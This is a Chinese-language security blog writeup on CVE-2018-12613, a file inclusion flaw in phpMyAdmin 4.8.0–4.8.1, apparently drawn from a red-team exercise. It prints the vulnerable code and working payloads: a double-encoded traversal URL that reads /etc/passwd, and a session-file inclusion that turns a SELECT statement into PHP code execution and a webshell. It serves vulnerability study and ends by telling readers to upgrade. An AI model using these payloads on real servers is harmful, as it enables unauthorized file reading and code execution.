---
title: phpmyadmin-4.8.1远程文件包含
cve: CVE-2018-12613
tags:
  - sec
date: 2024-09-18T15:33:13
lastmod: 2025-09-29T20:52:25
toc: "true"
draft: "false"
---
##  漏洞简介
phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。

这个漏洞刚刚打演练的时候用过,分析一下原理

##  影响版本
phpmyadmin 4.8.0 & 4.8.1
## 前提条件
能够进入后台,也就是要有数据库的凭据
## 前置知识
### php文件包含
服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。
文件包含相关函数
```bash
require()#函数出现错误的时候，会直接报错并退出程序的执行
require_once()#只包含一次
include()#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行
include_once()#只包含一次
```
文件包含分为本地文件包含和远程文件包含

远程文件包含利用需要下面这两个配置文件都开启
当allow_url_include和allow_url_fopen都开启时，可以通过利用远程url或者php://协议直接getshell，即远程文件包含，
但allow_url_include在php5.2之后默认为off，利用机会有限。
![](https://img.l1uyun.one/phpmyadmin-4.8.1远程文件包含_image_1.png)
当allow_url_include and allow_url_fopen均为off 在window主机环境下仍然可以进行远程文件执行，用445端口SMB协议进行远程加载。

## 漏洞复现
直接访问下面的路径,能输出passwd内容那就是有了

`/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd`
![](https://img.l1uyun.one/phpmyadmin-4.8.1远程文件包含_image_2.png)

利用方式的话,就是先在sql栏执行一下select命令,然后去包含session文件,就能获得webshell,进而拿shell

可以执行一下`SELECT <?=phpinfo()?>;`，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可：

对应的sessions文件是 /tmp/sess_sessionid
[phpmyadmin-4_8_1远程文件包含漏洞（CVE-2018-12613）](phpmyadmin-4_8_1远程文件包含漏洞（CVE-2018-12613）.pdf)

## 漏洞分析

简单来说就是phpmyadmin对用户传入的参数直接进行了包含,并且黑名单的检验不严格,可以绕过,从而导致了LFI
```php
index.php
// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}

# 黑名单
$target_blacklist = array (
    'import.php', 'export.php'
);
```
然后就是在phpmyadmin中,执行sql语句之后,会存储在session文件中,如果包含这个文件,就能让select里面的php代码被执行
```bash
/index.php?target=db_sql.php?/../../../../../../../../etc/passwd
#Windows环境下利用需要对?进行编码
/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_21faa6130eaba2b5e04e313bfacc60d4
```

## 漏洞发现
进入后台之后,查看版本信息
## 漏洞修复
升级phpmyadmin版本
##  相关漏洞
[phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞](phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞.md)

## 漏洞总结
这个漏洞刚刚演练的时候利用过,比较熟悉了...
记忆这个漏洞
- 组件:phpmyadmin
- 版本:4.8.1&4.8.0
- 漏洞类型:文件包含



假设你在尝试利用,挖掘这个漏洞
- 漏洞产生点:首页的target参数
- 漏洞类型:文件包含
- 漏洞利用方法:通过对sessions文件进行包含从而实现rce
- 遇到问题之后的解决方案: